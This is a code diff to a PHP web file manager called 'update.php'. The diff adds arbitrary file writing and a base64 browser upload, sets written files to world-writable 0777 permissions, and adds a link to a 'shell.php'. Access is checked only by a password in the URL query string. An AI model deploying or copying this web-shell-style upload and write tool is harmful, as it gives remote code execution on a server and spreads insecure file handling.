@@ -16,6 +16,7 @@ if(!isset($_GET["p"]) || $_GET["p"] != $pwd)
 
 $dir = $_GET["d"];
 $url0 = "update.php?p=$pwd&d=";
+$url1 = "shell.php?p=$pwd";
 $url = "$url0$dir";
 
 if(isset($_POST["dsubmit"]))
@@ -27,15 +28,35 @@ if(isset($_POST["dsubmit"]))
 	}
 }
 
+function _write_file($fn, $txt)
+{
+	if(file_exists($fn))
+	{
+		$writable = (is_writable($fn)) ? TRUE : chmod($fn, 0777);
+		if($writable)
+		{
+			file_put_contents($fn, $txt);
+		}
+	}
+	else
+	{
+		file_put_contents($fn, $txt);
+		chmod($fn, 0777);
+	}
+}
+
 if(isset($_POST["edsubmit"]))
 {
 	$fn = $dir . "/" . $_POST["edname"];
 	$txt = $_POST["edtext"];
-	$writable = (is_writable($fn)) ? TRUE : chmod($fn, 0755);
-	if($writable)
-	{
-		file_put_contents($fn, $txt);
-	}
+	_write_file($fn, $txt);
+}
+
+if(isset($_POST["upsubmit"]))
+{
+	$fn = $dir . "/" . $_POST["upname"];
+	$txt = $_POST["uptext"];
+	_write_file($fn, base64_decode($txt));
 }
 
 if(isset($_POST["ad"]))
@@ -147,13 +168,6 @@ h2
 	margin-bottom: 30px;
 }
 
-.upld
-{
-	width: 170px;
-	display: inline-block;
-	text-align: center;
-}
-
 .upld, input[type=submit], input[type=button]
 {
 	display: inline-block;
@@ -173,6 +187,15 @@ h2
 	color: white;
 	cursor: pointer;
 	transition: 0.1s all linear;
+}
+
+
+.upld
+{
+	width: 170px;
+	display: inline-block;
+	text-align: left;
+	padding: 5px 35px 5px 5px;
 }
 
 input[type=text]
@@ -251,6 +274,7 @@ textarea
 
 	echo "<p class=\"td\">Directory: $dir</p>";
 	echo "<p class=\"td\"><a href=\"$url0.\">Default</a> ";
+	echo "<a href=\"$url1\">Shell</a> ";
 	echo "<a href=\"$url0/\">Root</a> ";
 	echo "<a href=\"$url0$parent\">Parent</a> ";
 	echo "<a href=\"$url0$dir/..\">Previous</a></p>";
@@ -312,35 +336,72 @@ textarea
 		</form>
 	</div>
 
-	<!--<div class="part">
-		<form action="" method="post" enctype="multipart/form-data">
-			<h2>Upload file</h2>
-			<label for="upfile" class="upld" id="upfile0">Select File</label>
-			<input type="file" name="upfile" id="upfile" class="fup">
+	<div class="part">
+		<h2>Upload file</h2>
+		<p id="ready"></p>
+		<label for="upfile" class="upld" id="upfile0" style="float: left;">Select File</label>
+		<input type="file" name="upfile" id="upfile" class="fup" value="">
+
+		<form method="post" action="" style="float: left; margin-left: 7px;">
+			<input id="upname" name="upname" type="hidden">
+			<input id="uptext" name="uptext" type="hidden">
 			<input type="submit" value="Upload File" name="upsubmit">
 		</form>
-	</div>-->
+		<div style="clear: both;"></div>
+	</div>
+
 
 	<div class="part">
 		<form action="" method="post">
 			<h2>Edit file</h2>
 			<input type="text" name="edname" placeholder="Filename" value="<?php echo $efile; ?>">
 			<input type="submit" value="Save File" name="edsubmit">
-			<textarea name="edtext" rows="40" cols="80" spellcheck="false" placeholder="Content"><?php echo htmlspecialchars(file_get_contents($epath)); ?></textarea>
+			<textarea name="edtext" rows="40" cols="80" spellcheck="false" placeholder="Content"><?php if($epath && is_readable($epath)) { echo htmlspecialchars(file_get_contents($epath)); } ?></textarea>
 		</form>
 	</div>
 </td>
 </tr>
 </table>
-<!--
+
 <script type="text/javascript">
 
-document.getElementById("upfile").onchange = function()
+var curname = "";
+
+function readfile(e)
 {
-	document.getElementById("upfile0").innerText = document.getElementById("upfile").files[0].name;
-};
+	var file = e.target.files[0];
+	if(!file)
+	{
+		return;
+	}
+
+	curname = e.target.files[0].name;
+
+	var reader = new FileReader();
+	reader.onload = function(e)
+	{
+		var contents = e.target.result;
+		document.getElementById("uptext").value = btoa(contents);
+		document.getElementById("upname").value = curname;
+		document.getElementById("ready").innerText = "Ready to Upload!";
+	};
+
+	document.getElementById("ready").innerText = "Loading File ...";
+	reader.readAsBinaryString(file);
+}
+
+var elem_file = document.getElementById("upfile");
+var label_file = document.getElementById("upfile0");
+
+elem_file.addEventListener("change", function(e)
+{
+	label_file.innerText = elem_file.files[0].name;
+	readfile(e);
+	e.target.value = null;
+}, false);
+
 
 </script>
--->
+
 </body>
 </html>
